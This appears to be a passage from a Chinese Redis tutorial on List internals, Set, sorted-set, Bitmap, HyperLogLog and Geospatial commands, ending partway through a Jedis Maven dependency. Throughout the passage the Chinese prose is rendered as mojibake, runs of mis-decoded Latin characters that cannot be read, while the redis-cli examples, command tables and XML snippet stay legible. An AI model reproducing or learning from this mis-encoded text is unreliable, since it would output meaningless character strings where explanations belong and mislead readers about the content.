æ•°æ®ç»“æ„\n\nListçš„æ•°æ®ç»“æ„ä¸ºå¿«é€Ÿé“¾è¡¨quickListå’Œå‹ç¼©é“¾è¡¨ziplistã€‚\n\nå½“åˆ—è¡¨å…ƒç´ è¾ƒå°‘çš„æƒ…å†µä¸‹ä¼šä½¿ç”¨ä¸€å—è¿ç»­çš„å†…å­˜å­˜å‚¨ï¼Œè¿™ä¸ªç»“æ„æ˜¯ziplistã€‚å®ƒå°†æ‰€æœ‰çš„å…ƒç´ ç´§æŒ¨ç€ä¸€èµ·å­˜å‚¨ï¼Œåˆ†é…çš„æ˜¯ä¸€å—è¿ç»­çš„å†…å­˜ã€‚\n\nå½“æ•°æ®é‡æ¯”è¾ƒå¤šçš„æ—¶å€™æ‰ä¼šæ”¹æˆquicklistã€‚å› ä¸ºæ™®é€šçš„é“¾è¡¨éœ€è¦çš„é™„åŠ æŒ‡é’ˆç©ºé—´å¤ªå¤§ï¼Œä¼šæ¯”è¾ƒæµªè´¹ç©ºé—´ã€‚æ¯”å¦‚è¿™ä¸ªåˆ—è¡¨é‡Œå­˜çš„åªæ˜¯intç±»å‹çš„æ•°æ®ï¼Œç»“æ„ä¸Šè¿˜éœ€è¦ä¸¤ä¸ªé¢å¤–çš„æŒ‡é’ˆprevå’Œnextã€‚\n\nå°†é“¾è¡¨å’Œziplistç»“åˆèµ·æ¥ç»„æˆäº†quicklistã€‚ä¹Ÿå°±æ˜¯å°†å¤šä¸ªziplistä½¿ç”¨åŒå‘æŒ‡é’ˆä¸²èµ·æ¥ä½¿ç”¨ã€‚è¿™æ ·æ—¢æ»¡è¶³äº†å¿«é€Ÿçš„æ’å…¥åˆ é™¤æ€§èƒ½ï¼Œåˆä¸ä¼šå‡ºç°å¤ªå¤§çš„ç©ºé—´å†—ä½™ã€‚\n\n> **æ€è€ƒé—®é¢˜**\n\n- **å¦‚ä½•åˆ©ç”¨Listç»“æ„æ¨¡æ‹Ÿä¸€ä¸ªæ ˆ?**\n\n  - å…ˆè¿›åå‡ºï¼Œå…¥å£å’Œå‡ºå£åœ¨åŒä¸€è¾¹\n\n- **å¦‚ä½•åˆ©ç”¨Listç»“æ„æ¨¡æ‹Ÿä¸€ä¸ªé˜Ÿåˆ—?**\n\n  - å…ˆè¿›å…ˆå‡ºï¼Œå…¥å£å’Œå‡ºå£åœ¨ä¸åŒè¾¹\n\n- **å¦‚ä½•åˆ©ç”¨Listç»“æ„æ¨¡æ‹Ÿä¸€ä¸ªé˜»å¡é˜Ÿåˆ—?**\n  - å…¥å£å’Œå‡ºå£åœ¨ä¸åŒè¾¹\n  - å‡ºé˜Ÿæ—¶é‡‡ç”¨BLPOPæˆ–BRPOP\n\n### 2.4 é›†åˆ-Set\n\nRedisçš„Setæ˜¯stringç±»å‹çš„æ— åºé›†åˆã€‚å®ƒåº•å±‚å…¶å®æ˜¯ä¸€ä¸ªvalueä¸ºnullçš„hashè¡¨ï¼Œä¸Javaä¸­çš„HashSetç±»ä¼¼ï¼Œå› æ­¤å…·å¤‡ä¸HashSetç±»ä¼¼çš„ç‰¹å¾\n\n- æ— åº\n- å…ƒç´ ä¸å¯é‡å¤\n- æŸ¥æ‰¾å¿«\n- æ”¯æŒäº¤é›†ã€å¹¶é›†ã€å·®é›†ç­‰åŠŸèƒ½\n\n> **Setçš„å¸¸è§å‘½ä»¤æœ‰**\n\n|            å‘½ä»¤            |                   æè¿°                    |\n| :------------------------: | :---------------------------------------: |\n|    sadd key member ...     |         å‘setä¸­æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´          |\n|    srem key member ...     |            ç§»é™¤setä¸­çš„æŒ‡å®šå…ƒç´             |\n|         scard key          |            è¿”å›setä¸­å…ƒç´ çš„ä¸ªæ•°            |\n|    sismember key member    |        åˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºsetä¸­        |\n|        smembers key        |            è·å–setä¸­çš„æ‰€æœ‰å…ƒç´             |\n|    sinter key1 key2 ...    |            æ±‚key1ä¸key2çš„äº¤é›†             |\n|    sdiff key1 key2 ...     |            æ±‚key1ä¸key2çš„å·®é›†             |\n|    sunion key1 key2 ..     |            æ±‚key1å’Œkey2çš„å¹¶é›†             |\n|          spop key          |         éšæœºä»è¯¥é›†åˆä¸­åå‡ºä¸€ä¸ªå€¼          |\n|   srandmember \\<key>\\<n>   | éšæœºä»è¯¥é›†åˆä¸­å–å‡ºnä¸ªå€¼ã€‚ä¸ä¼šä»é›†åˆä¸­åˆ é™¤ |\n| smove \\<source>\\<des>value | æŠŠé›†åˆä¸­ä¸€ä¸ªå€¼ä»ä¸€ä¸ªé›†åˆç§»åŠ¨åˆ°å¦ä¸€ä¸ªé›†åˆ  |\n\n> äº¤é›†ã€å·®é›†ã€å¹¶é›†å›¾ç¤º\n\n![](https://img.jwt1399.top/img/202207161610130.png)\n\n> æ•°æ®ç»“æ„\n\nSetæ•°æ®ç»“æ„æ˜¯dictå­—å…¸ï¼Œå­—å…¸æ˜¯ç”¨å“ˆå¸Œè¡¨å®ç°çš„ã€‚Javaä¸­HashSetçš„å†…éƒ¨å®ç°ä½¿ç”¨çš„æ˜¯HashMapï¼Œåªä¸è¿‡æ‰€æœ‰çš„valueéƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡ã€‚Redisçš„setç»“æ„ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå®ƒçš„å†…éƒ¨ä¹Ÿä½¿ç”¨hashç»“æ„ï¼Œæ‰€æœ‰çš„valueéƒ½æŒ‡å‘åŒä¸€ä¸ªå†…éƒ¨å€¼ã€‚\n\n### 2.5 æœ‰åºé›†åˆ-ZSet\n\nRedisçš„ZSetï¼ˆSortedSetï¼‰æ˜¯ä¸€ä¸ªå¯æ’åºçš„seté›†åˆï¼Œä¸Javaä¸­çš„TreeSetæœ‰äº›ç±»ä¼¼ï¼Œä½†åº•å±‚æ•°æ®ç»“æ„å´å·®åˆ«å¾ˆå¤§ã€‚SortedSetä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½å¸¦æœ‰ä¸€ä¸ªscoreå±æ€§ï¼Œå¯ä»¥åŸºäºscoreå±æ€§å¯¹å…ƒç´ æ’åºï¼Œåº•å±‚çš„å®ç°æ˜¯ä¸€ä¸ªè·³è¡¨ï¼ˆSkipListï¼‰åŠ  hashè¡¨ã€‚\n\n**SortedSetå…·å¤‡ä¸‹åˆ—ç‰¹æ€§ï¼š**\n\n- å¯æ’åº\n- å…ƒç´ ä¸é‡å¤\n- æŸ¥è¯¢é€Ÿåº¦å¿«\n\nå› ä¸ºSortedSetçš„å¯æ’åºç‰¹æ€§ï¼Œç»å¸¸è¢«ç”¨æ¥å®ç°æ’è¡Œæ¦œè¿™æ ·çš„åŠŸèƒ½ã€‚\n\n> SortedSetçš„å¸¸è§å‘½ä»¤\n\n|             å‘½ä»¤             |                             æè¿°                             |\n| :--------------------------: | :----------------------------------------------------------: |\n|    zadd key score member     | æ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ åˆ°sorted set ï¼Œå¦‚æœå·²ç»å­˜åœ¨åˆ™æ›´æ–°å…¶scoreå€¼ |\n|       zrem key member        |                åˆ é™¤sorted setä¸­çš„ä¸€ä¸ªæŒ‡å®šå…ƒç´                 |\n|      zscore key member       |             è·å–sorted setä¸­çš„æŒ‡å®šå…ƒç´ çš„scoreå€¼              |\n|       zrankkey member        |              è·å–sorted set ä¸­çš„æŒ‡å®šå…ƒç´ çš„æ’å               |\n|          zcard key           |                  è·å–sorted setä¸­çš„å…ƒç´ ä¸ªæ•°                  |\n|      zcount key min max      |           ç»Ÿè®¡scoreå€¼åœ¨ç»™å®šèŒƒå›´å†…çš„æ‰€æœ‰å…ƒç´ çš„ä¸ªæ•°            |\n| zincrby key increment member |    è®©sorted setä¸­çš„æŒ‡å®šå…ƒç´ è‡ªå¢ï¼Œæ­¥é•¿ä¸ºæŒ‡å®šçš„incrementå€¼     |\n|      zrange key min max      |          æŒ‰ç…§scoreæ’åºåï¼Œè·å–æŒ‡å®šæ’åèŒƒå›´å†…çš„å…ƒç´            |\n|  zrangebyscore key min max   |          æŒ‰ç…§scoreæ’åºåï¼Œè·å–æŒ‡å®šscoreèŒƒå›´å†…çš„å…ƒç´           |\n|    zdiffã€zinterã€zunion     |                      æ±‚å·®é›†ã€äº¤é›†ã€å¹¶é›†                      |\n\n**æ³¨æ„ï¼šæ‰€æœ‰çš„æ’åé»˜è®¤éƒ½æ˜¯å‡åºï¼Œå¦‚æœè¦é™åºåˆ™åœ¨å‘½ä»¤çš„Zåé¢æ·»åŠ `REV`å³å¯**\n\n> æ•°æ®ç»“æ„\n\nSortedSet(zset)æ˜¯Redisæä¾›çš„ä¸€ä¸ªéå¸¸ç‰¹åˆ«çš„æ•°æ®ç»“æ„ï¼Œä¸€æ–¹é¢å®ƒç­‰ä»·äºJavaçš„æ•°æ®ç»“æ„Map<String, Double>ï¼Œå¯ä»¥ç»™æ¯ä¸€ä¸ªå…ƒç´ valueèµ‹äºˆä¸€ä¸ªæƒé‡scoreï¼Œå¦ä¸€æ–¹é¢å®ƒåˆç±»ä¼¼äºTreeSetï¼Œå†…éƒ¨çš„å…ƒç´ ä¼šæŒ‰ç…§æƒé‡scoreè¿›è¡Œæ’åºï¼Œå¯ä»¥å¾—åˆ°æ¯ä¸ªå…ƒç´ çš„åæ¬¡ï¼Œè¿˜å¯ä»¥é€šè¿‡scoreçš„èŒƒå›´æ¥è·å–å…ƒç´ çš„åˆ—è¡¨ã€‚\n\nzsetåº•å±‚ä½¿ç”¨äº†ä¸¤ä¸ªæ•°æ®ç»“æ„\n\nï¼ˆ1ï¼‰hashï¼Œhashçš„ä½œç”¨å°±æ˜¯å…³è”å…ƒç´ valueå’Œæƒé‡scoreï¼Œä¿éšœå…ƒç´ valueçš„å”¯ä¸€æ€§ï¼Œå¯ä»¥é€šè¿‡å…ƒç´ valueæ‰¾åˆ°ç›¸åº”çš„scoreå€¼ã€‚\n\nï¼ˆ2ï¼‰è·³è·ƒè¡¨ï¼Œè·³è·ƒè¡¨çš„ç›®çš„åœ¨äºç»™å…ƒç´ valueæ’åºï¼Œæ ¹æ®scoreçš„èŒƒå›´è·å–å…ƒç´ åˆ—è¡¨ã€‚\n\n## 3.ç‰¹æ®Šç±»å‹\n\n### 3.1 Bitmaps\n\n> ç®€ä»‹\n\nRedis æä¾›äº† Bitmaps å¯ä»¥å®ç°å¯¹ä½çš„æ“ä½œï¼Œå¯ä»¥æŠŠ Bitmaps æƒ³è±¡æˆä¸€ä¸ªä»¥ä½ä¸ºå•ä½çš„æ•°ç»„ï¼Œ æ•°ç»„çš„æ¯ä¸ªå•å…ƒåªèƒ½å­˜å‚¨ 0 å’Œ 1ï¼Œ æ•°ç»„çš„ä¸‹æ ‡åœ¨ Bitmaps ä¸­å«åšåç§»é‡ã€‚\n\n![](https://img.jwt1399.top/img/202207171437184.png)\n\n> Bitmapsçš„å¸¸è§å‘½ä»¤\n\n- setbit \\<key> \\<offset> \\<value> è®¾ç½®Bitmapsä¸­æŸä¸ªåç§»é‡çš„å€¼ï¼ˆ0æˆ–1ï¼‰\n- getbit \\<key> \\<offset> è·å–Bitmapsä¸­æŸä¸ªåç§»é‡çš„å€¼\n- bitcount \\<key> [start end] ç»Ÿè®¡å­—ç¬¦ä¸²ä»startå­—èŠ‚åˆ°endå­—èŠ‚æ¯”ç‰¹å€¼ä¸º1çš„æ•°é‡\n- bitop and(or/not/xor) \\<destkey> [keyâ€¦] å¯ä»¥åšå¤šä¸ªBitmapsçš„andï¼ˆäº¤é›†ï¼‰ ã€ orï¼ˆå¹¶é›†ï¼‰ ã€ notï¼ˆéï¼‰ ã€ xorï¼ˆå¼‚æˆ–ï¼‰ æ“ä½œå¹¶å°†ç»“æœä¿å­˜åœ¨destkeyä¸­ã€‚\n- BITFIELD ï¼šæ“ä½œï¼ˆæŸ¥è¯¢ã€ä¿®æ”¹ã€è‡ªå¢ï¼‰BitMapä¸­bitæ•°ç»„ä¸­çš„æŒ‡å®šä½ç½®ï¼ˆoffsetï¼‰çš„å€¼\n\n```sql\nBITFIELD key GET encoding offset|[OVERFLOW WRAP|SAT|FAIL] SET encoding offset value|INCRBY encoding offset increment \n\n#  GETæŸ¥è¯¢ SETä¿®æ”¹ INCRBYè‡ªå¢\n#  encoding è®¾ç½®ç¬¦å·ä½å’Œæ“ä½œé•¿åº¦ï¼Œuä»£è¡¨æ— ç¬¦å·ï¼Œiä»£è¡¨æœ‰ç¬¦å·\n#  offset åç§»é‡ï¼Œä»ç¬¬å‡ ä½å¼€å§‹\n\n# æŸ¥è¯¢bitæ•°ç»„ä¸­ä»0ä½å¼€å§‹çš„2ä½ï¼Œè¿”å›10è¿›åˆ¶\nBITFIELD key GET u2 0\n# ä¾‹å¦‚æ•°æ®æ˜¯11100ï¼Œåˆ™è¿”å›3\n```\n\n- BITFIELD_RO ï¼šæŸ¥è¯¢BitMapä¸­bitæ•°ç»„ï¼Œå¹¶ä»¥åè¿›åˆ¶å½¢å¼è¿”å›ï¼ŒROï¼šREAD_ONLY\n\n```sql\n# åŠŸèƒ½è·ŸBITFIELDçš„æŸ¥è¯¢åŠŸèƒ½ä¸€æ ·\nBITFIELD_RO key GET encoding offset [GET encoding offset ...]\n```\n\n> å®ä¾‹1\n\næ¯ä¸ªç‹¬ç«‹ç”¨æˆ·æ˜¯å¦è®¿é—®è¿‡ç½‘ç«™ï¼Œç»“æœå­˜æ”¾åœ¨Bitmapsä¸­ï¼Œ å°†è®¿é—®çš„ç”¨æˆ·è®°åš1ï¼Œ æ²¡æœ‰è®¿é—®çš„ç”¨æˆ·è®°åš0ï¼Œ ç”¨åç§»é‡ä½œä¸ºç”¨æˆ·çš„idã€‚ å‡è®¾ç°åœ¨æœ‰20ä¸ªç”¨æˆ·ï¼Œuserid=1ï¼Œ 6ï¼Œ 11ï¼Œ 15ï¼Œ 19çš„ç”¨æˆ·å¯¹ç½‘ç«™è¿›è¡Œäº†è®¿é—®ï¼Œ é‚£ä¹ˆå½“å‰Bitmapsåˆå§‹åŒ–ç»“æœå¦‚å›¾\n\n![](https://img.jwt1399.top/img/202212041311883.png)\n\nusers:20220717ä»£è¡¨2022-07-17è¿™å¤©çš„ç‹¬ç«‹è®¿é—®ç”¨æˆ·çš„Bitmaps\n\n```bash\n127.0.0.1:6379> setbit users:20220717 1 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 6 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 11 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 15 1\n(integer) 0\n127.0.0.1:6379> setbit users:20220717 19 1\n(integer) 0\n```\n\nè·å–id=6ï¼Œ8çš„ç”¨æˆ·æ˜¯å¦åœ¨2022-07-17è¿™å¤©è®¿é—®è¿‡ï¼Œ è¿”å›0è¯´æ˜æ²¡æœ‰è®¿é—®è¿‡ï¼Œè¿”å›1è¯´æ˜è®¿é—®è¿‡\n\n```bash\n127.0.0.1:6379> getbit users:20220717 6\n(integer) 1\n127.0.0.1:6379> getbit users:20220717 8\n(integer) 0\n```\n\nè®¡ç®—2022-07-17è¿™å¤©çš„ç‹¬ç«‹è®¿é—®ç”¨æˆ·æ•°é‡\n\n```bash\n127.0.0.1:6379> bitcount users:20220717\n(integer) 5\n```\n\nstartå’Œendä»£è¡¨èµ·å§‹å’Œç»“æŸå­—èŠ‚æ•°ï¼Œ ä¸‹é¢è®¡ç®—ç”¨æˆ·idåœ¨ç¬¬1ä¸ªå­—èŠ‚åˆ°ç¬¬3ä¸ªå­—èŠ‚ä¹‹é—´çš„ç‹¬ç«‹è®¿é—®ç”¨æˆ·æ•°ï¼Œ å¯¹åº”çš„ç”¨æˆ·idæ˜¯11ï¼Œ 15ï¼Œ 19ã€‚\n\n```bash\n127.0.0.1:6379> bitcount users:20220717 1 3\n(integer) 3\n```\n\nä¸¾ä¾‹ï¼š K1 ã€01000001 01000000 00000000 00100001ã€‘ï¼Œå¯¹åº”ã€0ï¼Œ1ï¼Œ2ï¼Œ3ã€‘\n\n- bitcount K1 1 2 ï¼š ç»Ÿè®¡ä¸‹æ ‡1ã€2å­—èŠ‚ç»„ä¸­bit=1çš„ä¸ªæ•°ï¼Œå³ 01000000 00000000  --ã€‹1\n\n- bitcount K1 1 3 ï¼š ç»Ÿè®¡ä¸‹æ ‡1ã€3å­—èŠ‚ç»„ä¸­bit=1çš„ä¸ªæ•°ï¼Œå³01000000 00000000 00100001 --ã€‹3\n- bitcount K1 0 -2 ï¼š ç»Ÿè®¡ä¸‹æ ‡0åˆ°ä¸‹æ ‡å€’æ•°ç¬¬2ï¼Œå­—èŠ‚ç»„ä¸­bit=1çš„ä¸ªæ•°ï¼Œå³01000001 01000000  00000000 --ã€‹3\n\n> å®ä¾‹2\n\n2022-07-02 æ—¥è®¿é—®ç½‘ç«™çš„userid=1,2,5,9ã€‚\n\n```sql\nsetbit users:20220702 1 1\n\nsetbit users:20220702 2 1\n\nsetbit users:20220702 5 1\n\nsetbit users:20220702 9 1\n```\n\n2022-07-03 æ—¥è®¿é—®ç½‘ç«™çš„userid=0,1,4,9ã€‚\n\n```sql\nsetbit users:20220703 0 1\n\nsetbit users:20220703 1 1\n\nsetbit users:20220703 4 1\n\nsetbit users:20220703 9 1\n```\n\nè®¡ç®—å‡ºä¸¤å¤©éƒ½è®¿é—®è¿‡ç½‘ç«™çš„ç”¨æˆ·æ•°é‡\n\n```bash\n127.0.0.1:6379> bitop and users:and:20220702_03 users:20220702 users:20220703\n(integer) 2\n127.0.0.1:6379> bitcount users:and:20220702_03\n(integer) 2\n```\n\nè®¡ç®—å‡ºä»»æ„ä¸€å¤©éƒ½è®¿é—®è¿‡ç½‘ç«™çš„ç”¨æˆ·æ•°é‡ï¼ˆä¾‹å¦‚æœˆæ´»è·ƒå°±æ˜¯ç±»ä¼¼è¿™ç§ï¼‰ ï¼Œ å¯ä»¥ä½¿ç”¨oræ±‚å¹¶é›†\n\n```bash\n127.0.0.1:6379> bitop or users:or:20220702_03 users:20220702 users:20220703\n(integer) 2\n127.0.0.1:6379> bitcount users:or:20220702_03\n(integer) 6\n```\n\n> Bitmapsä¸setå¯¹æ¯”\n\nå‡è®¾ç½‘ç«™æœ‰1äº¿ç”¨æˆ·ï¼Œ æ¯å¤©ç‹¬ç«‹è®¿é—®çš„ç”¨æˆ·æœ‰5åƒä¸‡ï¼Œ å¦‚æœæ¯å¤©ç”¨é›†åˆç±»å‹å’ŒBitmapsåˆ†åˆ«å­˜å‚¨æ´»è·ƒç”¨æˆ·å¯ä»¥å¾—åˆ°è¡¨\n\n| æ•°æ®ç±»å‹ | æ¯ä¸ªç”¨æˆ·idå ç”¨ç©ºé—´ | éœ€è¦å­˜å‚¨çš„ç”¨æˆ·é‡ |     å…¨éƒ¨å†…å­˜é‡     |\n| :------: | :----------------: | :--------------: | :----------------: |\n| é›†åˆç±»å‹ |        64ä½        |      5åƒä¸‡       | 64ä½*5åƒä¸‡ = 400MB |\n| Bitmaps  |        1ä½         |       1äº¿        |  1ä½*1äº¿ = 12.5MB  |\n\nå¾ˆæ˜æ˜¾ï¼Œ è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨Bitmapsèƒ½èŠ‚çœå¾ˆå¤šçš„å†…å­˜ç©ºé—´ï¼Œ å°¤å…¶æ˜¯éšç€æ—¶é—´æ¨ç§»èŠ‚çœçš„å†…å­˜æ˜¯éå¸¸å¯è§‚çš„\n\n| æ•°æ®ç±»å‹ |  ä¸€å¤©  | ä¸€ä¸ªæœˆ | ä¸€å¹´  |\n| :------: | :----: | :----: | :---: |\n| é›†åˆç±»å‹ | 400MB  |  12GB  | 144GB |\n| Bitmaps  | 12.5MB | 375MB  | 4.5GB |\n\nä½†Bitmapså¹¶ä¸æ˜¯ä¸‡é‡‘æ²¹ï¼Œ å‡å¦‚è¯¥ç½‘ç«™æ¯å¤©çš„ç‹¬ç«‹è®¿é—®ç”¨æˆ·å¾ˆå°‘ï¼Œ ä¾‹å¦‚åªæœ‰10ä¸‡ï¼ˆå¤§é‡çš„åƒµå°¸ç”¨æˆ·ï¼‰ ï¼Œ é‚£ä¹ˆä¸¤è€…çš„å¯¹æ¯”å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼Œ å¾ˆæ˜¾ç„¶ï¼Œ è¿™æ—¶å€™ä½¿ç”¨Bitmapså°±ä¸å¤ªåˆé€‚äº†ï¼Œ å› ä¸ºåŸºæœ¬ä¸Šå¤§éƒ¨åˆ†ä½éƒ½æ˜¯0ã€‚\n\n| æ•°æ®ç±»å‹ | æ¯ä¸ªuseridå ç”¨ç©ºé—´ | éœ€è¦å­˜å‚¨çš„ç”¨æˆ·é‡ |     å…¨éƒ¨å†…å­˜é‡     |\n| :------: | :----------------: | :--------------: | :----------------: |\n| é›†åˆç±»å‹ |        64ä½        |       10ä¸‡       | 64ä½*10ä¸‡ = 800KB  |\n| Bitmaps  |        1ä½         |       1äº¿        | 1ä½* 1äº¿  = 12.5MB |\n\n### 3.2 HyperLogLog\n\n> ç®€ä»‹\n\nåœ¨å·¥ä½œå½“ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°ä¸ç»Ÿè®¡ç›¸å…³çš„åŠŸèƒ½éœ€æ±‚ï¼Œæ¯”å¦‚ç»Ÿè®¡ç½‘ç«™PVï¼ˆPageViewé¡µé¢è®¿é—®é‡ï¼‰,å¯ä»¥ä½¿ç”¨Redisçš„incrã€incrbyè½»æ¾å®ç°ã€‚ä½†åƒUVï¼ˆUniqueVisitorï¼Œç‹¬ç«‹è®¿å®¢ï¼‰ã€ç‹¬ç«‹IPæ•°ã€æœç´¢è®°å½•æ•°ç­‰éœ€è¦å»é‡å’Œè®¡æ•°çš„é—®é¢˜å¦‚ä½•è§£å†³ï¼Ÿè¿™ç§æ±‚é›†åˆä¸­ä¸é‡å¤å…ƒç´ ä¸ªæ•°çš„é—®é¢˜ç§°ä¸º**åŸºæ•°é—®é¢˜**ã€‚\n\nè§£å†³åŸºæ•°é—®é¢˜æœ‰å¾ˆå¤šç§æ–¹æ¡ˆï¼š\n\n- ï¼ˆ1ï¼‰æ•°æ®å­˜å‚¨åœ¨MySQLè¡¨ä¸­ï¼Œä½¿ç”¨distinct countè®¡ç®—ä¸é‡å¤ä¸ªæ•°\n\n- ï¼ˆ2ï¼‰ä½¿ç”¨Redisæä¾›çš„hashã€setã€bitmapsç­‰æ•°æ®ç»“æ„æ¥å¤„ç†\n\nä»¥ä¸Šçš„æ–¹æ¡ˆç»“æœç²¾ç¡®ï¼Œä½†éšç€æ•°æ®ä¸æ–­å¢åŠ ï¼Œå¯¼è‡´å ç”¨ç©ºé—´è¶Šæ¥è¶Šå¤§ï¼Œå½“æ•°æ®é›†éå¸¸å¤§æ—¶æ˜¯ä¸åˆ‡å®é™…çš„ã€‚\n\nèƒ½å¦èƒ½å¤Ÿé™ä½ä¸€å®šçš„ç²¾åº¦æ¥å¹³è¡¡å­˜å‚¨ç©ºé—´ï¼ŸRedisæ¨å‡ºäº†HyperLogLog\n\n- HyperLogLog æ˜¯ç”¨æ¥åšåŸºæ•°ç»Ÿè®¡çš„ç®—æ³•ï¼ŒHyperLogLog çš„ä¼˜ç‚¹æ˜¯ï¼Œåœ¨è¾“å…¥å…ƒç´ çš„æ•°é‡æˆ–è€…ä½“ç§¯éå¸¸éå¸¸å¤§æ—¶ï¼Œè®¡ç®—åŸºæ•°æ‰€éœ€çš„ç©ºé—´æ€»æ˜¯å›ºå®šçš„ã€å¹¶ä¸”æ˜¯å¾ˆå°çš„ã€‚\n\n- åœ¨ Redis é‡Œé¢ï¼Œæ¯ä¸ª HyperLogLog é”®åªéœ€è¦èŠ±è´¹ 12KB å†…å­˜ï¼Œå°±å¯ä»¥è®¡ç®—æ¥è¿‘ 2<sup>64</sup> ä¸ªä¸åŒå…ƒç´ çš„åŸºæ•°ã€‚è¿™å’Œè®¡ç®—åŸºæ•°æ—¶ï¼Œå…ƒç´ è¶Šå¤šè€—è´¹å†…å­˜å°±è¶Šå¤šçš„é›†åˆå½¢æˆé²œæ˜å¯¹æ¯”ã€‚\n\n- ä½†æ˜¯ï¼Œå› ä¸º HyperLogLog åªä¼šæ ¹æ®è¾“å…¥å…ƒç´ æ¥è®¡ç®—åŸºæ•°ï¼Œè€Œä¸ä¼šå‚¨å­˜è¾“å…¥å…ƒç´ æœ¬èº«ï¼Œæ‰€ä»¥ HyperLogLog ä¸èƒ½åƒé›†åˆé‚£æ ·ï¼Œè¿”å›è¾“å…¥çš„å„ä¸ªå…ƒç´ ã€‚\n\nä»€ä¹ˆæ˜¯åŸºæ•°?\n\næ¯”å¦‚æ•°æ®é›† {1, 3, 5, 7, 5, 7, 8}ï¼Œ é‚£ä¹ˆè¿™ä¸ªæ•°æ®é›†çš„åŸºæ•°é›†ä¸º {1, 3, 5 ,7, 8}, åŸºæ•°(ä¸é‡å¤å…ƒç´ )ä¸º5ã€‚ åŸºæ•°ä¼°è®¡å°±æ˜¯åœ¨è¯¯å·®å¯æ¥å—çš„èŒƒå›´å†…ï¼Œå¿«é€Ÿè®¡ç®—åŸºæ•°ã€‚\n\n> HyperLogLogçš„å¸¸è§å‘½ä»¤\n\n- pfadd \\<key> \\<element> [element ...]  æ·»åŠ æŒ‡å®šå…ƒç´ åˆ° HyperLogLog ä¸­\n\n```bash\n127.0.0.1:6379> pfadd hll \"redis\"\n(integer) 1\n127.0.0.1:6379> pfadd hll \"mysql\"\n(integer) 1\n127.0.0.1:6379> pfadd hll \"redis\"\n(integer) 0\n```\n\n- pfcount \\<key> [key ...] è®¡ç®—HLLçš„è¿‘ä¼¼åŸºæ•°ï¼Œå¯ä»¥è®¡ç®—å¤šä¸ªHLLï¼Œæ¯”å¦‚ç”¨HLLå­˜å‚¨æ¯å¤©çš„UVï¼Œè®¡ç®—ä¸€å‘¨çš„UVå¯ä»¥ä½¿ç”¨7å¤©çš„UVåˆå¹¶è®¡ç®—å³å¯\n\n```bash\n127.0.0.1:6379> pfcount hll\n(integer) 2\n\n127.0.0.1:6379> pfadd hll2 \"mongodb\"\n(integer) 1\n127.0.0.1:6379> pfadd hll2 \"redis\"\n(integer) 1\n127.0.0.1:6379> pfcount hll hll2\n(integer) 3\n```\n\n- pfmerge \\<destkey> \\<sourcekey> [sourcekey ...] å°†ä¸€ä¸ªæˆ–å¤šä¸ªHLLåˆå¹¶åçš„ç»“æœå­˜å‚¨åœ¨å¦ä¸€ä¸ªHLLä¸­ï¼Œæ¯”å¦‚æ¯æœˆæ´»è·ƒç”¨æˆ·å¯ä»¥ä½¿ç”¨æ¯å¤©çš„æ´»è·ƒç”¨æˆ·æ¥åˆå¹¶è®¡ç®—å¯å¾—\n\n```bash\n127.0.0.1:6379> pfmerge hllsum hll hll2\nOK\n127.0.0.1:6379> pfcount hllsum\n(integer) 3\n```\n\n### 3.3 Geospatial\n\n> ç®€ä»‹\n\nRedis 3.2 ä¸­å¢åŠ äº†å¯¹GEOç±»å‹çš„æ”¯æŒã€‚GEOï¼ŒGeographicï¼Œåœ°ç†ä¿¡æ¯çš„ç¼©å†™ã€‚è¯¥ç±»å‹å°±æ˜¯å…ƒç´ çš„2ç»´åæ ‡ï¼Œåœ¨åœ°å›¾ä¸Šå°±æ˜¯ç»çº¬åº¦ã€‚redisåŸºäºè¯¥ç±»å‹ï¼Œæä¾›äº†ç»çº¬åº¦è®¾ç½®ï¼ŒæŸ¥è¯¢ï¼ŒèŒƒå›´æŸ¥è¯¢ï¼Œè·ç¦»æŸ¥è¯¢ï¼Œç»çº¬åº¦Hashç­‰å¸¸è§æ“ä½œã€‚\n\n>å‘½ä»¤\n\n- geoadd \\<key> < longitude> \\<latitude> \\<member> [longitude latitude member...]  æ·»åŠ åœ°ç†ä½ç½®ï¼ˆç»åº¦ï¼Œçº¬åº¦ï¼Œåç§°ï¼‰\n\n```bash\ngeoadd china:city 121.47 31.23 shanghai\ngeoadd china:city 106.50 29.53 chongqing 114.05 22.52 shenzhen 116.38 39.90 beijing\n```\n\n- geopos \\<key>\\<member> [member...] è·å¾—æŒ‡å®šåœ°åŒºçš„åæ ‡å€¼\n\n```bash\n127.0.0.1:6379> geopos china:city shanghai\n1) 1) \"121.47000163793563843\"\n   2) \"31.22999903975783553\"\n```\n\n- geodist \\<key> \\<member1>\\<member2> [m|km|ft|mi] è·å–ä¸¤ä¸ªä½ç½®ä¹‹é—´çš„ç›´çº¿è·ç¦»\n  - m è¡¨ç¤ºå•ä½ä¸ºç±³[é»˜è®¤å€¼]\n  - km è¡¨ç¤ºå•ä½ä¸ºåƒç±³\n  - ft è¡¨ç¤ºå•ä½ä¸ºè‹±å°º\n  - mi è¡¨ç¤ºå•ä½ä¸ºè‹±é‡Œ\n\n```bash\n127.0.0.1:6379> geodist china:city shanghai beijing km\n\"1068.1535\"\n```\n\n- georadius \\<key> \\<longitude> \\<latitude> radius m|km|ft|mi  ä»¥ç»™å®šçš„ç»çº¬åº¦ä¸ºä¸­å¿ƒï¼Œæ‰¾å‡ºæŸä¸€åŠå¾„å†…çš„å…ƒç´ \n\n```bash\n127.0.0.1:6379> georadius china:city 110 30 1000 km\n1) \"chongqing\"\n2) \"shenzhen\"\n```\n\n# å››ã€Jedis\n\n## 1.å¼•å…¥ä¾èµ–\n\n```xml\n<!--å¼•å…¥Jedisä¾èµ–-->\n<dependency>\n    <groupId>redis.clients</groupId>\n    <artifactId>jedis</artifactId>\n    <version>4.2.0</version>\n</dependency>\n\n<!--å¼•å…¥å•å…ƒæµ‹è¯•ä¾èµ–-->\n<dependency>\n    